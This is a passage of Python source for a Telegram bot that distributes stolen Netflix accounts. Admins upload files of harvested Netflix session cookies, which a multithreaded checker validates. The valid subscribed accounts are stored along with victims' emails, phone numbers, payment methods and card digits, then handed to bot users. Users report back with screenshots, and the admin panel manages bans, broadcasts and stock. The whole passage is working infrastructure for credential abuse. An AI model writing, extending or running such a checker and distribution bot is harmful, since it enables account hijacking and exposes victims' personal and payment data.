            account_id = int(data.split("_")[2])
        else:
            assigned = get_assigned_account(user_id)
            if assigned:
                account_id = assigned["id"]
                
        if not account_id:
            await send_or_edit(update, "⚠️ No active assigned account found. Please click 'Get Account'.")
            return
        
        db.execute('''
            UPDATE users 
            SET pending_report = 1, pending_report_account_id = ?, pending_report_type = 'notworking'
            WHERE user_id = ?
        ''', (account_id, user_id))
        db.commit()
        
        await send_or_edit(
            update,
            "❌ <b>Report Type: NOT WORKING</b>\n\n"
            "📸 <b>Please upload a screenshot proof now!</b>\n\n"
            "⚠️ Send an image showing the login or playback error.\n\n"
            "👨‍💻 <b>Developer:</b> @Senzo268"
        )
    except Exception as e:
        logger.error(f"Error in notworking_callback: {e}")

async def handle_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        user_data = get_user(user_id)
        
        if safe_bool(user_data.get("is_banned")):
            await update.message.reply_text("🚫 You are banned from using this bot.")
            return
            
        photo = update.message.photo
        if not photo:
            await update.message.reply_text("❌ Please upload an image/screenshot proof.")
            return
        file_id = photo[-1].file_id
        caption = update.message.caption or ""

        # Check Admin Photo Broadcast
        if user_id in ADMIN_IDS and context.user_data.get("waiting_for_broadcast"):
            context.user_data["waiting_for_broadcast"] = False
            users = get_all_users()
            active_users = [u for u in users if not u['is_banned']]
            total_u = len(active_users)
            
            status_msg = await update.message.reply_text(f"🚀 Broadcasting photo to <b>{total_u}</b> users...", parse_mode=ParseMode.HTML)
            success, failed = 0, 0
            for u in active_users:
                try:
                    await context.bot.send_photo(u['user_id'], photo=file_id, caption=caption, parse_mode=ParseMode.HTML)
                    success += 1
                except Exception:
                    failed += 1
                await asyncio.sleep(0.05)
                
            await status_msg.edit_text(
                f"✅ <b>PHOTO BROADCAST COMPLETE!</b>\n\n"
                f"🎯 Total Users: <b>{total_u}</b>\n"
                f"✅ Delivered: <b>{success}</b>\n"
                f"❌ Failed/Blocked: <b>{failed}</b>",
                parse_mode=ParseMode.HTML
            )
            return

        # Screenshot Proof Handler for Pending Report
        if not safe_bool(user_data.get("pending_report")):
            await update.message.reply_text("❌ You do not have an active pending report.")
            return
        
        account_id = safe_int(user_data.get("pending_report_account_id"))
        report_type = safe_str(user_data.get("pending_report_type"))
        
        try:
            cur = db.execute('''
                INSERT INTO reports (user_id, account_id, report_type, screenshot_file_id)
                VALUES (?, ?, ?, ?)
            ''', (user_id, account_id, report_type, file_id))
            report_id = cur.lastrowid
            
            if report_type == "working":
                db.execute('UPDATE users SET working_reports = working_reports + 1 WHERE user_id = ?', (user_id,))
            else:
                db.execute('UPDATE users SET notworking_reports = notworking_reports + 1 WHERE user_id = ?', (user_id,))
            
            db.execute('''
                UPDATE users 
                SET pending_report = 0, pending_report_account_id = NULL, pending_report_type = NULL
                WHERE user_id = ?
            ''', (user_id,))
            db.commit()
        except Exception as e:
            logger.error(f"Error inserting report: {e}")
            await update.message.reply_text("❌ Failed to save report in database.")
            return
        
        await update.message.reply_text(
            f"✅ <b>Report Submitted Successfully!</b>\n\n"
            f"📋 <b>Report ID:</b> #{report_id}\n"
            f"🎯 <b>Status:</b> {report_type.upper()}\n\n"
            f"Thank you! Your report has been submitted to admins for review.\n"
            f"👨‍💻 <b>Developer:</b> @Senzo268",
            parse_mode=ParseMode.HTML
        )
        
        if report_type == "working":
            await send_working_to_channel(context.bot, report_id, user_id, account_id, file_id)
        else:
            await send_notworking_to_channel(context.bot, report_id, user_id, account_id, file_id)
        
        release_account(account_id)
    except Exception as e:
        logger.error(f"Error in handle_screenshot: {e}")
        await update.message.reply_text("❌ Error processing your screenshot.")

async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        user = get_user(user_id)
        account = get_assigned_account(user_id)
        
        text = f"""📊 <b>YOUR ACCOUNT & STATS SUMMARY</b>
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> {h(user.get('first_name'))}
🆔 <b>ID:</b> <code>{user_id}</code>
📅 <b>Joined:</b> {h(user.get('joined_at'))}
━━━━━━━━━━━━━━━━━━━━━
📈 <b>STATISTICS</b>
┌─────────────────────
│ ✅ Working Reports: <b>{safe_int(user.get('working_reports'))}</b>
│ ❌ Not Working: <b>{safe_int(user.get('notworking_reports'))}</b>
│ 📦 Accounts Used: <b>{safe_int(user.get('accounts_used'))}/{MAX_ACCOUNTS_PER_USER}</b>
│ ⚠️ Warnings: <b>{safe_int(user.get('warnings'))}/3</b>
└─────────────────────
🔑 <b>CURRENT ASSIGNED ACCOUNT:</b>
"""
        if account:
            text += f"""┌─────────────────────
│ 📧 <code>{h(account.get('email'))}</code>
│ 🌍 Country: {h(account.get('country'))}
│ 📦 Plan: {h(account.get('plan'))}
│ 📺 Streams: {safe_int(account.get('streams'))}
└─────────────────────
"""
        else:
            text += "❌ None assigned currently\n"
        
        text += f"\n⏳ <b>Cooldown Period:</b> {WORKING_COOLDOWN_MINUTES} min"
        text += "\n\n👨‍💻 <b>Developer:</b> @Senzo268"
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in my_status: {e}")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        stats = get_total_accounts()
        users = get_all_users()
        plan_display = ""
        for plan, count in stats.get('plans', {}).items():
            emoji = {"PREMIUM": "👑", "STANDARD": "⭐", "BASIC": "🎯", "MOBILE": "📱", "FREE": "🆓"}.get(plan.upper(), "📦")
            plan_display += f"│ {emoji} {h(plan)}: <b>{count}</b>\n"
        if not plan_display:
            plan_display = "│ No accounts available\n"

        text = f"""📊 <b>PUBLIC BOT METRICS</b>
━━━━━━━━━━━━━━━━━━━━━
📦 <b>Total Available Stock:</b> <b>{stats.get('total')}</b>
{plan_display}
👥 <b>Registered Users:</b> <b>{len(users)}</b>
⏳ <b>Cooldown:</b> {WORKING_COOLDOWN_MINUTES} min
👨‍💻 <b>Developer:</b> @Senzo268
"""
        keyboard = [[InlineKeyboardButton("🎯 Get Account", callback_data="get_account")], [InlineKeyboardButton("🔙 Back", callback_data="back_menu")]]
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in stats_command: {e}")

async def contact_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data["waiting_for_message"] = True
        keyboard = [[InlineKeyboardButton("🔙 Cancel / Back", callback_data="back_menu")]]
        await send_or_edit(
            update,
            "📝 <b>CONTACT ADMIN</b>\n\nPlease type and send your message below. The admin team will reply to you directly!\n\n👨‍💻 <b>Developer:</b> @Senzo268",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        logger.error(f"Error in contact_admin: {e}")

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data.clear()
        await start(update, context)
    except Exception as e:
        logger.error(f"Error in back_to_menu: {e}")

# ============================================================
# ADMIN PANEL & STOCK MANAGER
# ============================================================

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await send_or_edit(update, "⛔ Not authorized!")
            return
        
        context.user_data.clear()
        stats = get_total_accounts()
        banned = get_banned_users()
        pending_reps = get_pending_reports()
        
        keyboard = [
            [InlineKeyboardButton("📤 Upload Stock", callback_data="admin_upload"), InlineKeyboardButton("📦 Manage Stock", callback_data="admin_stock_mgr")],
            [InlineKeyboardButton("👁️ View Reports", callback_data="admin_reports"), InlineKeyboardButton("👥 Manage Users", callback_data="admin_users")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"), InlineKeyboardButton("⚙️ Channels", callback_data="admin_channels")],
            [InlineKeyboardButton("📊 Stock Logs", callback_data="admin_stock_logs"), InlineKeyboardButton("📈 Dashboard", callback_data="admin_dashboard")],
            [InlineKeyboardButton("🚫 Banned Users", callback_data="admin_banned"), InlineKeyboardButton("🔍 Search User", callback_data="admin_user_search")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")],
        ]
        
        text = f"""⚙️ <b>ADMIN CONTROL PANEL</b>
━━━━━━━━━━━━━━━━━━━━━
🖥️ <b>SYSTEM STATUS</b>
┌─────────────────────
│ Status: <b>🟢 ONLINE</b>
│ Database: <b>{'✅ Turso (Cloud)' if db.use_turso else '⚠️ SQLite (Local)'}</b>
│ Check Threads: <b>{MAX_CHECK_THREADS}</b>
│ Report Channel: <b>{'✅ Connected' if REPORT_CHANNEL_ID else '❌ Not Configured'}</b>
└─────────────────────
📊 <b>OVERVIEW METRICS</b>
┌─────────────────────
│ 📦 Total Available Stock: <b>{safe_int(stats.get('total'))}</b>
│ 📋 Pending Reports: <b>{len(pending_reps)}</b>
│ 🚫 Banned Users: <b>{len(banned)}</b>
└─────────────────────
🔽 <b>SELECT ADMIN ACTION:</b>
👨‍💻 <b>Developer:</b> @Senzo268
"""
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in admin_panel: {e}")

async def admin_stock_mgr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await send_or_edit(update, "⛔ Not authorized!")
            return

        data = update.callback_query.data if update.callback_query else ""
        plan_filter = None
        if data.startswith("sm_filter_"):
            plan_filter = data.split("_")[2]
            if plan_filter == "ALL":
                plan_filter = None

        accounts = get_available_accounts(plan_filter)
        stats = get_total_accounts()

        text = f"""📦 <b>ACCOUNT STOCK MANAGER</b>
━━━━━━━━━━━━━━━━━━━━━
Total Available Stock: <b>{stats.get('total')}</b>
Filter Plan: <b>{h(plan_filter or 'ALL')}</b>
Found Accounts: <b>{len(accounts)}</b>
━━━━━━━━━━━━━━━━━━━━━
"""
        keyboard = [
            [
                InlineKeyboardButton("All", callback_data="sm_filter_ALL"),
                InlineKeyboardButton("👑 Premium", callback_data="sm_filter_PREMIUM"),
                InlineKeyboardButton("⭐ Standard", callback_data="sm_filter_STANDARD"),
                InlineKeyboardButton("🎯 Basic", callback_data="sm_filter_BASIC"),
            ]
        ]

        if not accounts:
            text += "<i>No accounts found in this category.</i>\n"
        else:
            for acc in accounts[:10]:
                text += f"▫️ <b>ID #{acc['id']}</b> | <code>{h(acc['email'])}</code> | {h(acc['plan'])}\n"
                keyboard.append([InlineKeyboardButton(f"🗑️ Delete #{acc['id']} ({acc['email']})", callback_data=f"del_acc_{acc['id']}")])

        text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
        keyboard.append([InlineKeyboardButton("🚨 Clear Category Stock", callback_data=f"clear_stock_{plan_filter or 'ALL'}")])
        keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
        
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in admin_stock_mgr: {e}")

async def delete_account_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        if user_id not in ADMIN_IDS:
            return
            
        data = query.data
        if data.startswith("del_acc_"):
            acc_id = int(data.split("_")[2])
            delete_account(acc_id)
            await query.answer(f"✅ Account #{acc_id} deleted!")
            await admin_stock_mgr(update, context)
        elif data.startswith("clear_stock_"):
            pfilter = data.split("_")[2]
            pfilter_arg = None if pfilter == "ALL" else pfilter
            cleared = clear_all_accounts(pfilter_arg)
            await query.answer(f"✅ Cleared {cleared} accounts!")
            await admin_stock_mgr(update, context)
    except Exception as e:
        logger.error(f"Error in delete_account_callback: {e}")

async def admin_user_search_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
        context.user_data["waiting_for_user_search"] = True
        keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data="admin_users")]]
        await send_or_edit(
            update,
            "🔍 <b>SEARCH USER</b>\n\n"
            "Please type and send the User ID or @username below:\n"
            "Example: <code>123456789</code> or <code>@john_doe</code>\n\n"
            "👨‍💻 <b>Developer:</b> @Senzo268",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        logger.error(f"Error in admin_user_search_prompt: {e}")

async def admin_banned(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await send_or_edit(update, "⛔ Not authorized!")
            return
        
        banned = get_banned_users()
        keyboard = []
        text = "🚫 <b>BANNED USERS LIST</b>\n\n"
        if not banned:
            text += "<i>No users are currently banned.</i>\n"
        else:
            for uid, uname, fname in banned[:20]:
                text += f"▫️ <b>{h(fname)}</b> (@{h(uname)}) - ID: <code>{uid}</code>\n"
                keyboard.append([InlineKeyboardButton(f"🔓 Unban {uid}", callback_data=f"unban_user_{uid}")])
                
        text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
        keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in admin_banned: {e}")

async def unban_user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        if user_id not in ADMIN_IDS:
            return
            
        data = query.data
        parts = data.split("_")
        if len(parts) >= 3:
            target_uid = int(parts[2])
            unban_user_from_bot(target_uid, user_id)
            await query.answer(f"✅ User {target_uid} unbanned!")
            await admin_banned(update, context)
    except Exception as e:
        logger.error(f"Error in unban_user_callback: {e}")

async def admin_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await send_or_edit(update, "⛔ Not authorized!")
            return
        
        keyboard = [[InlineKeyboardButton("🔙 Cancel / Back", callback_data="admin_panel")]]
        await send_or_edit(
            update,
            "📤 <b>UPLOAD STOCK FILE</b>\n\n"
            "Please send a <b>.txt</b>, <b>.json</b>, or <b>.zip</b> file containing Netflix cookie credentials.\n\n"
            "⚡ <i>Supports parallel multi-thread checking & auto-extracting zip files!</i>\n\n"
            "👨‍💻 <b>Developer:</b> @Senzo268",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        context.user_data["waiting_for_upload"] = True
    except Exception as e:
        logger.error(f"Error in admin_upload: {e}")

# ============================================================
# FIXED: handle_file_upload - SHOWS PROGRESS & SAVES PROPERLY
# ============================================================

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("⛔ Not authorized!")
            return
        
        if not context.user_data.get("waiting_for_upload"):
            return
        
        document = update.message.document
        if not document:
            await update.message.reply_text("❌ Please send a valid document file (.txt, .json, .zip).")
            return
        
        file_name = document.file_name
        if not file_name.lower().endswith(('.txt', '.json', '.zip', '.netscape', '.cookies')):
            await update.message.reply_text("❌ Supported formats are .txt, .json, .zip, .netscape, .cookies")
            return
        
        status_msg = await update.message.reply_text(f"⏳ Downloading <b>{h(file_name)}</b>...", parse_mode=ParseMode.HTML)
        
        file = await context.bot.get_file(document.file_id)
        file_bytes = await file.download_as_bytearray()
        
        cookie_pairs = []
        
        if file_name.lower().endswith('.zip'):
            try:
                with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
                    for zip_info in zf.infolist():
                        if not zip_info.is_dir() and zip_info.filename.lower().endswith(('.txt', '.json', '.netscape', '.cookies')):
                            try:
                                content_bytes = zf.read(zip_info.filename)
                                text_content = content_bytes.decode('utf-8', errors='ignore')
                                pairs = extract_cookie_pairs(text_content)
                                cookie_pairs.extend(pairs)
                            except Exception:
                                pass
            except Exception as e:
                logger.error(f"Zip extract error: {e}")
                await status_msg.edit_text("❌ Failed to parse ZIP file content.")
                return
        else:
            text_content = file_bytes.decode('utf-8', errors='ignore')
            cookie_pairs = extract_cookie_pairs(text_content)
            
        if not cookie_pairs:
            await status_msg.edit_text("❌ No valid Netflix cookie pairs found in uploaded file.")
            context.user_data["waiting_for_upload"] = False
            return
            
        total = len(cookie_pairs)
        await status_msg.edit_text(f"🔄 Found <b>{total}</b> cookies. Starting multi-threaded check with {MAX_CHECK_THREADS} threads...", parse_mode=ParseMode.HTML)
        
        valid = 0
        accounts = []
        saved = 0
        
        def check_item(item):
            nid, sid = item
            cdict = {"NetflixId": nid}
            if sid:
                cdict["SecureNetflixId"] = sid
            res = check_account(cdict)
            return item, res

        loop = asyncio.get_running_loop()
        
        with ThreadPoolExecutor(max_workers=MAX_CHECK_THREADS) as executor:
            futures = [loop.run_in_executor(executor, check_item, item) for item in cookie_pairs]
            completed = 0
            for future in asyncio.as_completed(futures):
                completed += 1
                (nid, sid), result = await future
                if result.get("valid") and result.get("subscribed"):
                    cookie_text = get_cookie_text(nid, sid)
                    accounts.append({
                        "email": safe_str(result.get("email")),
                        "country": safe_str(result.get("country")),
                        "plan": safe_str(result.get("plan_label", "Unknown")),
                        "cookies": cookie_text,
                        "nftoken": safe_str(result.get("nftoken")),
                        "nftoken_expiry": safe_str(result.get("nftoken_expiry")),
                        "source_file": file_name,
                        "account_name": safe_str(result.get("name")),
                        "streams": safe_int(result.get("streams")),
                        "quality": safe_str(result.get("quality")),
                        "price": safe_str(result.get("price")),
                        "billing_date": safe_str(result.get("billing_date")),
                        "member_since": safe_str(result.get("member_since")),
                        "payment_method": safe_str(result.get("payment_method")),
                        "card_last4": safe_str(result.get("card_last4")),
                        "phone": safe_str(result.get("phone")),
                        "extra_member": safe_bool(result.get("extra_member")),
                        "membership_status": safe_str(result.get("membership_status")),
                        "email_verified": safe_bool(result.get("email_verified")),
                        "profiles": safe_str(result.get("profiles")),
                        "user_guid": safe_str(result.get("user_guid")),
                    })
                    valid += 1
                
                # Update progress every 5 accounts
                if completed % 5 == 0 or completed == total:
                    try:
                        await status_msg.edit_text(
                            f"🔄 Multi-Thread Progress: <b>{completed}/{total}</b> | ✅ Valid: <b>{valid}</b> | 💾 Saved: <b>{len(accounts)}</b>",
                            parse_mode=ParseMode.HTML
                        )
                    except Exception:
                        pass
                        
        # Save accounts after all checks are complete
        if accounts:
            saved = save_account_batch(accounts)
            log_stock(user_id, file_name, total, saved)
            await status_msg.edit_text(
                f"✅ <b>STOCK UPLOAD COMPLETE!</b>\n\n"
                f"📁 <b>File:</b> {h(file_name)}\n"
                f"🔍 <b>Found:</b> {total}\n"
                f"✅ <b>Valid Subscribed:</b> {valid}\n"
                f"💾 <b>Saved to DB:</b> {saved}\n\n"
                f"👨‍💻 <b>Developer:</b> @Senzo268",
                parse_mode=ParseMode.HTML
            )
        else:
            log_stock(user_id, file_name, total, 0)
            await status_msg.edit_text(
                f"❌ <b>NO VALID ACTIVE ACCOUNTS FOUND!</b>\n\n"
                f"📁 <b>File:</b> {h(file_name)}\n"
                f"🔍 <b>Total Checked:</b> {total}\n\n"
                f"👨‍💻 <b>Developer:</b> @Senzo268",
                parse_mode=ParseMode.HTML
            )
            
        context.user_data["waiting_for_upload"] = False
    except Exception as e:
        logger.error(f"Error in handle_file_upload: {e}")
        context.user_data["waiting_for_upload"] = False

async def admin_reports(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await send_or_edit(update, "⛔ Not authorized!")
            return
            
        reports = get_pending_reports()
        keyboard = []
        text = "📋 <b>PENDING USER REPORTS</b>\n\n"
        
        if not reports:
            text += "<i>No pending reports right now.</i>\n"
        else:
            for rep in reports[:10]:
                text += f"▫️ <b>Report #{rep['id']}</b> | Type: {rep['report_type'].upper()} | User: @{h(rep['username'])} (ID: <code>{rep['user_id']}</code>)\n"
                keyboard.append([
                    InlineKeyboardButton(f"🔍 View Report #{rep['id']}", callback_data=f"view_rep_{rep['id']}")
                ])
                
        text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
        keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in admin_reports: {e}")

async def view_report_detail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
            
        query = update.callback_query
        rep_id = int(query.data.split("_")[2])
        cur = db.execute('''
            SELECT r.id, r.user_id, r.account_id, r.report_type, r.screenshot_file_id, r.reported_at, u.username, a.email
            FROM reports r
            LEFT JOIN users u ON r.user_id = u.user_id
            LEFT JOIN accounts a ON r.account_id = a.id
            WHERE r.id = ?
        ''', (rep_id,))
        r = cur.fetchone()
        if not r:
            await send_or_edit(update, "Report not found!")
            return
            
        text = f"""📋 <b>REPORT #{r[0]} DETAILS</b>

━━━━━━━━━━━━━━━━━━━━━
👤 <b>User:</b> @{h(r[6])} (ID: <code>{r[1]}</code>)
📧 <b>Account Email:</b> <code>{h(r[7])}</code> (Account ID: {r[2]})
🎯 <b>Reported Status:</b> {safe_str(r[3]).upper()}
📅 <b>Timestamp:</b> {h(r[5])}
━━━━━━━━━━━━━━━━━━━━━
"""
        keyboard = [
            [InlineKeyboardButton("✅ Confirm Working", callback_data=f"confirm_working_{r[0]}_{r[2]}")],
            [InlineKeyboardButton("⚠️ Warn User", callback_data=f"warn_user_{r[0]}_{r[2]}_{r[1]}"), InlineKeyboardButton("🚫 Ban User", callback_data=f"ban_user_{r[0]}_{r[2]}_{r[1]}")],
            [InlineKeyboardButton("❌ Dismiss Report", callback_data=f"dismiss_report_{r[0]}_{r[2]}")],
            [InlineKeyboardButton("🔙 Back to Reports", callback_data="admin_reports")]
        ]
        
        if r[4]:
            try:
                await context.bot.send_photo(
                    chat_id=update.effective_chat.id,
                    photo=r[4],
                    caption=text,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode=ParseMode.HTML
                )
                return
            except Exception:
                pass
                
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in view_report_detail: {e}")

async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await send_or_edit(update, "⛔ Not authorized!")
            return
            
        users = get_all_users()
        text = f"👥 <b>BOT USERS ({len(users)})</b>\n\n"
        keyboard = [[InlineKeyboardButton("🔍 Search User by ID/@username", callback_data="admin_user_search")]]
        
        for u in users[:15]:
            status_str = "🚫 BANNED" if u['is_banned'] else "🟢 Active"
            text += f"▫️ <b>{h(u['first_name'])}</b> (@{h(u['username'])}) | ID: <code>{u['user_id']}</code> | Status: {status_str} | Warns: {u['warnings']}/3\n"
            keyboard.append([InlineKeyboardButton(f"👤 Manage User {u['user_id']}", callback_data=f"manage_user_{u['user_id']}")])
            
        text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
        keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in admin_users: {e}")

async def manage_user_detail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
            
        query = update.callback_query
        target_uid = int(query.data.split("_")[2])
        user = get_user(target_uid)
        
        text = f"""👤 <b>USER MANAGEMENT: {h(user.get('first_name'))}</b>
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>User ID:</b> <code>{target_uid}</code>
Username: @{h(user.get('username'))}
📅 Joined: {h(user.get('joined_at'))}
🚫 Banned: {'YES' if user.get('is_banned') else 'NO'}
⚠️ Warnings: {user.get('warnings')}/3
📦 Accounts Used: {user.get('accounts_used')}/{MAX_ACCOUNTS_PER_USER}
✅ Working Reports: {user.get('working_reports')}
❌ Not Working Reports: {user.get('notworking_reports')}
━━━━━━━━━━━━━━━━━━━━━
"""
        keyboard = []
        if user.get('is_banned'):
            keyboard.append([InlineKeyboardButton("🔓 Unban User", callback_data=f"unban_user_{target_uid}")])
        else:
            keyboard.append([InlineKeyboardButton("🚫 Ban User", callback_data=f"admin_ban_{target_uid}")])
            keyboard.append([InlineKeyboardButton("⚠️ Warn User (+1)", callback_data=f"admin_warn_{target_uid}")])
            
        keyboard.append([InlineKeyboardButton("🔄 Reset Limits / Cooldown", callback_data=f"reset_user_{target_uid}")])
        keyboard.append([InlineKeyboardButton("🔙 Back to Users", callback_data="admin_users")])
        
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in manage_user_detail: {e}")

async def user_command_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
            
        args = context.args
        if not args:
            await update.message.reply_text("Usage: <code>/user &lt;user_id or @username&gt;</code>", parse_mode=ParseMode.HTML)
            return
            
        target = args[0]
        user = find_user_by_query(target)
        if not user or not user.get('user_id'):
            await update.message.reply_text(f"❌ User <b>{h(target)}</b> not found in database.", parse_mode=ParseMode.HTML)
            return
            
        target_uid = user['user_id']
        text = f"""👤 <b>USER LOOKUP RESULT: {h(user.get('first_name'))}</b>
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>User ID:</b> <code>{target_uid}</code>
Username: @{h(user.get('username'))}
📅 Joined: {h(user.get('joined_at'))}
🚫 Banned: {'YES' if user.get('is_banned') else 'NO'}
⚠️ Warnings: {user.get('warnings')}/3
📦 Accounts Used: {user.get('accounts_used')}/{MAX_ACCOUNTS_PER_USER}
✅ Working Reports: {user.get('working_reports')}
❌ Not Working Reports: {user.get('notworking_reports')}
━━━━━━━━━━━━━━━━━━━━━
"""
        keyboard = []
        if user.get('is_banned'):
            keyboard.append([InlineKeyboardButton("🔓 Unban User", callback_data=f"unban_user_{target_uid}")])
        else:
            keyboard.append([InlineKeyboardButton("🚫 Ban User", callback_data=f"admin_ban_{target_uid}")])
            keyboard.append([InlineKeyboardButton("⚠️ Warn User (+1)", callback_data=f"admin_warn_{target_uid}")])
            
        keyboard.append([InlineKeyboardButton("🔄 Reset Limits / Cooldown", callback_data=f"reset_user_{target_uid}")])
        keyboard.append([InlineKeyboardButton("🔙 Back to Users", callback_data="admin_users")])
        
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Error in user_command_lookup: {e}")

async def admin_user_actions_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        admin_id = query.from_user.id
        if admin_id not in ADMIN_IDS:
            return
            
        data = query.data
        parts = data.split("_")
        action = parts[0] + "_" + parts[1]
        target_uid = int(parts[2])
        
        if action == "admin_ban":
            ban_user_from_bot(target_uid, admin_id, "Banned by Admin action")
            await query.answer("🚫 User banned!")
        elif action == "admin_warn":
            w = add_warning(target_uid, admin_id, "Warning by Admin action")
            await query.answer(f"⚠️ User warned ({w}/3)!")
        elif action == "reset_user":
            db.execute('UPDATE users SET accounts_used = 0, last_account_time = NULL WHERE user_id = ?', (target_uid,))
            db.commit()
            await query.answer("🔄 User limits and cooldown reset!")
            
        await manage_user_detail(update, context)
    except Exception as e:
        logger.error(f"Error in admin_user_actions_callback: {e}")

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await send_or_edit(update, "⛔ Not authorized!")
            return
            
        keyboard = [[InlineKeyboardButton("🔙 Cancel / Back", callback_data="admin_panel")]]
        await send_or_edit(
            update,
            "📢 <b>BROADCAST ANNOUNCEMENT</b>\n\n"
            "Please send the text message or photo (with caption) you want to broadcast to all registered users.\n\n"
            "👨‍💻 <b>Developer:</b> @Senzo268",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        context.user_data["waiting_for_broadcast"] = True
    except Exception as e:
        logger.error(f"Error in admin_broadcast: {e}")

async def admin_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await send_or_edit(update, "⛔ Not authorized!")
            return
            
        cur = db.execute('SELECT id, channel_id, channel_name, invite_link, is_active FROM channels')
        channels = cur.fetchall()
        
        text = f"""⚙️ <b>CHANNEL MANAGEMENT</b>
━━━━━━━━━━━━━━━━━━━━━
📢 <b>Report Channel ID:</b> <code>{REPORT_CHANNEL_ID if REPORT_CHANNEL_ID else 'NOT SET'}</code>
━━━━━━━━━━━━━━━━━━━━━
🛡️ <b>FORCE-SUBSCRIBE CHANNELS:</b>
"""
        keyboard = []
        if not channels:
            text += "<i>No force-sub channels configured.</i>\n"
        else:
            for ch in channels:
                status = "🟢 Active" if ch[4] else "🔴 Inactive"
                text += f"▫️ <b>{h(ch[2])}</b> (<code>{h(ch[1])}</code>) | {status}\n"
                keyboard.append([InlineKeyboardButton(f"❌ Remove {h(ch[2])}", callback_data=f"del_channel_{ch[0]}")])
                
        text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
        keyboard.append([InlineKeyboardButton("➕ Add Required Channel", callback_data="add_channel_prompt")])
        keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in admin_channels: {e}")

async def add_channel_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data["waiting_for_channel"] = True
        keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data="admin_channels")]]
